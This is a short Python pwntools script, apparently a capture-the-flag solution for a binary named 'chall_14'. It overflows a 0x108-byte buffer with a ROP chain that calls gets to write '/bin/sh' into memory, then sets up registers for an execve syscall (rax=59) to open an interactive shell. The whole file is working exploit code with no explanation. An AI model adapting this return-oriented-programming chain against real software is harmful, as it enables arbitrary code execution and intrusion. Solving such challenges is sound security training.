from pwn import *
from sys import argv
gets = 0x411930
popRdi = 0x4018ca
writeTo = 0x4c00e0
syscall = 0x4012d3
popRax = 0x4494a7
popRsi = 0x40f3fe
context.arch="amd64"
p = gdb.debug("./chall_14",gdbscript="""la asm
b main
continue""")
elf = ELF("./chall_14")
rop = ROP(elf)
rop.call(b"gets",(writeTo,))
rop(rax=59,rdi=writeTo)
#exploit here
payload = b'a'*0x108
payload2 = b'/bin/sh\x00'
payload += p64(popRdi)
payload += p64(writeTo)
payload += p64(gets)
payload += p64(popRdi)
payload += p64(writeTo)
payload += p64(popRsi)
payload += p64(0)
payload += p64(popRax)
payload += p64(59)
payload += p64(syscall)
p.recvline()
p.sendline(payload)
p.sendline(payload2)
p.interactive()
